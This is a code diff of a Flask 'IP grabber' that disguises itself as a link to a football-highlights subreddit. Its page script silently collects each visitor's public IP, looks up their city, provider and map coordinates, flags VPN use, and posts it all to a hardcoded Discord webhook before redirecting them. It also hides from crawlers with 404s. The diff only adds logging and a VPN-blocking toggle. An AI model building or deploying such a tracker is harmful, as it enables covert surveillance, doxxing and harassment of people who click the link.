@@ -1,14 +1,14 @@
-# main.py
+# main.py © [20/01/25] by [IP GRABBER]. All rights reserved.
 """
-Visitor logger — immediate send on every click (no cooldown).
- - Browser-based public IP (api.ipify)
- - Server-side enrichment via ipapi.co, fallback ipwho.is
- - Enhanced VPN/proxy detection (org keywords + PTR)
- - Proxy IP & port extraction
- - Debug logging to file (visitor_debug.log)
- - Bot blocking, VPN blocking (404)
- - Sends a single Discord embed for each click (no dedupe)
- - Redirects visitor to REDIRECT_URL
+Fixed visitor logger:
+ - Browser-based public IP collection via api.ipify
+ - ipapi.co + ipwho.is fallback enrichment
+ - enhanced VPN/proxy detection (logged)
+ - proxy IP + port captured and shown separately
+ - debug logging file + console prints
+ - can BLOCK VPNs if BLOCK_VPN = True (default False for testing)
+ - no more accidental 404s due to detection while testing
+ - sends a single Discord embed per click
 """
 
 from flask import Flask, request, redirect, jsonify, abort
@@ -19,13 +19,21 @@ import time
 import socket
 import os
 import re
+import traceback
 
 app = Flask(__name__)
 
 # ========== CONFIG ==========
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
 REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"
-COOLDOWN_SECONDS = 0  # 0 = immediate repeats allowed (every click sends)
+
+# Set to True to block detected VPNs/proxies (will return 404). Default False so testing works.
+BLOCK_VPN = False
+
+# seconds between webhooks from same IP; 0 disables cooldown (every click sends)
+COOLDOWN_SECONDS = 0
+
+# Debug log file path
 DEBUG_LOG_PATH = os.getenv("VISITOR_DEBUG_LOG", "visitor_debug.log")
 
 # UA bot keywords
@@ -51,12 +59,29 @@ VPN_KEYWORDS_EXPANDED = [
     "tunnelbear","anchorfree","psiphon","proton"
 ]
 
-# no cooldown tracking needed when COOLDOWN_SECONDS == 0, but keep structure if you change later
+# cooldown tracking (kept but unused when COOLDOWN_SECONDS == 0)
 last_sent_by_ip = {}
+
+def clear_last_sent():
+    global last_sent_by_ip
+    last_sent_by_ip = {}
+    threading.Timer(86400, clear_last_sent).start()
+clear_last_sent()
 
 # ========== UTIL ==========
 def now_gmt():
     return datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S GMT")
+
+def log_debug_line(line: str):
+    """Write debug line to file and print to console."""
+    try:
+        ts_line = f"{now_gmt()} | {line}\n"
+        print(ts_line.strip())
+        with open(DEBUG_LOG_PATH, "a", encoding="utf-8") as f:
+            f.write(ts_line)
+    except Exception:
+        # avoid crashing on logging
+        print("Failed to write debug log:", traceback.format_exc())
 
 def is_bot_ua(ua: str) -> bool:
     if not ua:
@@ -71,8 +96,10 @@ def fetch_ipapi(ip: str) -> dict:
         r = requests.get(f"https://ipapi.co/{ip}/json/", headers=headers, timeout=6)
         if r.status_code == 200:
             return r.json() or {}
-    except Exception:
-        pass
+        else:
+            log_debug_line(f"ipapi non-200 for {ip}: {r.status_code}")
+    except Exception as e:
+        log_debug_line(f"ipapi error for {ip}: {e}")
     return {}
 
 def fetch_ipwho_is(ip: str) -> dict:
@@ -82,8 +109,12 @@ def fetch_ipwho_is(ip: str) -> dict:
             data = r.json() or {}
             if data.get("success", True) is not False:
                 return data
-    except Exception:
-        pass
+            else:
+                log_debug_line(f"ipwho.is returned success=false for {ip}")
+        else:
+            log_debug_line(f"ipwho.is non-200 for {ip}: {r.status_code}")
+    except Exception as e:
+        log_debug_line(f"ipwho.is error for {ip}: {e}")
     return {}
 
 def enrich_ip(ip: str) -> dict:
@@ -121,7 +152,7 @@ def enrich_ip(ip: str) -> dict:
     details["_source"] = source
     return details
 
-# ========== VPN/PROXY DETECTION (ENHANCED) ==========
+# ========== VPN/PROXY DETECTION (ENHANCED, LOG-ONLY unless BLOCK_VPN True) ==========
 def reverse_dns_ptr(ip: str, timeout_sec: float = 0.45) -> str:
     try:
         orig = socket.getdefaulttimeout()
@@ -137,24 +168,24 @@ def reverse_dns_ptr(ip: str, timeout_sec: float = 0.45) -> str:
 def detect_vpn_or_proxy(details: dict, ip: str = None) -> bool:
     sec = details.get("security") or {}
     if isinstance(sec, dict) and (sec.get("vpn") or sec.get("proxy") or sec.get("hosting")):
-        _log_debug(ip, details.get("org"), "security-flag", True)
+        log_debug_line(f"vpn_flag via ipapi.security for {ip} - org={details.get('org')}")
         return True
 
     raw = details.get("raw_fallback") or {}
     if isinstance(raw, dict):
         if raw.get("threat"):
-            _log_debug(ip, details.get("org"), str(raw.get("threat")), True)
+            log_debug_line(f"vpn_flag via raw_fallback threat for {ip}")
             return True
         typ = raw.get("type") or raw.get("connection", {}).get("type")
         if typ and str(typ).lower() in ("hosting", "vpn", "proxy"):
-            _log_debug(ip, details.get("org"), f"type:{typ}", True)
+            log_debug_line(f"vpn_flag via raw_fallback type={typ} for {ip}")
             return True
 
     org = (details.get("org") or "") or ""
     org_l = org.lower()
     for kw in VPN_KEYWORDS_EXPANDED + CLOUD_ORG_KEYWORDS:
         if kw in org_l:
-            _log_debug(ip, org, "org-keyword", True)
+            log_debug_line(f"vpn_flag via org keyword '{kw}' for {ip}, org={org}")
             return True
 
     ptr = ""
@@ -168,22 +199,13 @@ def detect_vpn_or_proxy(details: dict, ip: str = None) -> bool:
                     "client","dialup","dynamic","dsl","ppp","mobile"
                 ]
                 if any(ind in ptr_l for ind in ptr_indicators):
-                    _log_debug(ip, org, ptr, True)
+                    log_debug_line(f"vpn_flag via PTR '{ptr}' for {ip}")
                     return True
     except Exception:
         pass
 
-    _log_debug(ip, org, ptr or "none", False)
+    # No detection -> return False
     return False
-
-# ========== DEBUG LOGGING ==========
-def _log_debug(ip: str, org: str, ptr_host: str, vpn_flag: bool):
-    try:
-        line = f"{now_gmt()} | ip={ip} | org={org or 'None'} | ptr={ptr_host or 'None'} | vpn={vpn_flag}\n"
-        with open(DEBUG_LOG_PATH, "a", encoding="utf-8") as f:
-            f.write(line)
-    except Exception:
-        pass
 
 # ========== PROXY EXTRACTION HELPERS ==========
 def parse_forwarded_header(forwarded_val: str):
@@ -202,16 +224,19 @@ def parse_forwarded_header(forwarded_val: str):
     return entries
 
 def extract_proxy_info_from_headers():
+    # X-Forwarded-For: last element is the last proxy that connected to you
     xff = request.headers.get("X-Forwarded-For", "")
     if xff:
         parts = [p.strip() for p in xff.split(",") if p.strip()]
-        if len(parts) >= 2:
+        if len(parts) >= 1:
+            # last element is the most recent proxy (or the last hop)
             last = parts[-1]
             if ":" in last and last.count(":") == 1:
                 ip_part, port_part = last.split(":", 1)
                 return ip_part, port_part, "X-Forwarded-For:last"
             return last, request.environ.get("REMOTE_PORT"), "X-Forwarded-For:last"
 
+    # Forwarded header: check 'by' then 'for'
     fwd = request.headers.get("Forwarded", "")
     if fwd:
         parsed = parse_forwarded_header(fwd)
@@ -236,6 +261,7 @@ def extract_proxy_info_from_headers():
     if tci:
         return tci, request.environ.get("REMOTE_PORT"), "True-Client-IP"
 
+    # fallback: remote addr + remote port
     return request.remote_addr, request.environ.get("REMOTE_PORT"), "remote_addr"
 
 # ========== MAP & DISCORD ==========
@@ -278,14 +304,17 @@ def send_discord_embed(info: dict) -> bool:
         }]
     }
     try:
-        r = requests.post(DISCORD_WEBHOOK_URL, json=embed_payload, timeout=6)
+        r = requests.post(DISCORD_WEBHOOK_URL, json=embed_payload, timeout=8)
+        log_debug_line(f"Discord webhook status for {info.get('real_ip')}: {r.status_code} {r.text[:200]}")
         return 200 <= r.status_code < 300
-    except Exception:
+    except Exception as e:
+        log_debug_line(f"Discord webhook error for {info.get('real_ip')}: {e}")
         return False
 
 # ========== ROUTES ===========
 @app.route('/')
 def root():
+    # Serve JS that fetches public IP and posts to /log, then redirects
     html = f"""
     <!doctype html>
     <html>
@@ -325,11 +354,12 @@ def log():
     if not real_ip:
         return jsonify({"error": "no ip provided"}), 400
 
-    # quick UA bot check -> 404
+    # quick UA bot check -> 404 (still blocks known crawlers)
     if is_bot_ua(user_agent):
+        log_debug_line(f"blocked bot ua: {user_agent}")
         abort(404)
 
-    # cooldown check (COOLDOWN_SECONDS == 0 means always allow)
+    # cooldown logic (disabled when COOLDOWN_SECONDS == 0)
     now_ts = time.time()
     last_ts = last_sent_by_ip.get(real_ip, 0)
     if COOLDOWN_SECONDS > 0 and (now_ts - last_ts) < COOLDOWN_SECONDS:
@@ -337,20 +367,31 @@ def log():
 
     # determine proxy info (best-effort)
     proxy_ip, proxy_port, proxy_source = extract_proxy_info_from_headers()
+    log_debug_line(f"received log request: real_ip={real_ip}, proxy_ip={proxy_ip}, proxy_port={proxy_port}, proxy_source={proxy_source}, ua={user_agent}")
 
     # enrich based on the real IP (location of visitor)
     details = enrich_ip(real_ip)
 
-    # enhanced VPN/proxy detection: pass the *real* IP details and also check proxy org
+    # detect vpn/proxy (log-only unless BLOCK_VPN True)
     vpn_flag = detect_vpn_or_proxy(details, ip=real_ip)
+
+    # also check proxy connecting IP's org as heuristic
+    proxy_vpn_flag = False
     if proxy_ip and proxy_ip != real_ip:
         proxy_details = enrich_ip(proxy_ip)
-        if detect_vpn_or_proxy(proxy_details, ip=proxy_ip):
-            vpn_flag = True
+        proxy_vpn_flag = detect_vpn_or_proxy(proxy_details, ip=proxy_ip)
+        if proxy_vpn_flag:
+            log_debug_line(f"proxy IP {proxy_ip} flagged as vpn/proxy by heuristics")
 
-    if vpn_flag:
+    effective_vpn = vpn_flag or proxy_vpn_flag
+    log_debug_line(f"vpn detection: real_vpn={vpn_flag}, proxy_vpn={proxy_vpn_flag}, effective={effective_vpn}")
+
+    # If blocking is enabled, abort here
+    if BLOCK_VPN and effective_vpn:
+        log_debug_line(f"blocking request from {real_ip} due to VPN/proxy detection (BLOCK_VPN=True)")
         abort(404)
 
+    # prepare info for embed
     info = {
         "real_ip": real_ip,
         "proxy_ip": proxy_ip,
@@ -363,20 +404,23 @@ def log():
         "org": details.get("org") or None,
         "latitude": details.get("latitude") or 0,
         "longitude": details.get("longitude") or 0,
-        "vpn": vpn_flag,
+        "vpn": effective_vpn,
         "_source": details.get("_source"),
         "time": now_gmt()
     }
     info["map_url"] = build_map_url(details)
 
-    # mark before sending (kept for future cooldown toggles)
+    # mark last-sent time (kept for potential future cooldown settings)
     last_sent_by_ip[real_ip] = now_ts
 
-    # send embed (single)
-    send_discord_embed(info)
+    # send the embed and log result
+    success = send_discord_embed(info)
+    if not success:
+        log_debug_line(f"Failed to send embed for {real_ip}")
 
-    return jsonify({"status": "ok"}), 200
+    return jsonify({"status": "ok", "sent": success}), 200
 
 # ========== RUN ===========
 if __name__ == "__main__":
+    # Run on 0.0.0.0:10000 by default. In production use gunicorn main:app
     app.run(host="0.0.0.0", port=10000, debug=False)
